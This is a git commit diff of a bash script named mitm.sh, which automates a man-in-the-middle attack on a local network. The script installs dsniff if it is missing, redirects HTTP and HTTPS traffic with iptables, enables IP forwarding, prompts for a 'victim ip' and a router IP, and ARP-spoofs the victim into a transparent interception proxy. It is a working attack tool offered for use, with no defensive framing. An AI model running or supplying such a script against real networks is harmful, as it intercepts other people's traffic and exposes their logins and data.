da4ba541417c1d1df35b49673fe298fa5483da17
alexmihalyk23 <alexmihalyk23@gmail.com>
2019-04-29 09:57:46 +0700

    release v2

--- mitm.sh
+++ mitm.sh
@@ -1,13 +1,23 @@
 #!/bin/bash
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+l=dsniff
+l2=xterm
+I=`dpkg -s $l | grep "Status"`
+I2=`dpkg -s $l2 | grep "Status"`
+if [[ -n "$I" && -n "$l2" ]]; then
+	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
 echo "1" > /proc/sys/net/ipv4/ip_forward
 while [ "$net" = "" ]; do
-    echo -n "Enter victim ip and  router ip with space "
+    echo -n "Enter victim ip: "
     read net
+    echo -n  "Enter router ip: "
+    read net1
     if [ -n "$net" ]; then
-        arpspoof -i wlp3s0 -t $net &
+        arpspoof -i wlp3s0 -t $net $net1 &
         xterm -e "./mitm --mode transparent"
     fi
     killall arpspoof
 done
+else
+	apt install dsniff -y && apt install xterm -y
+fi
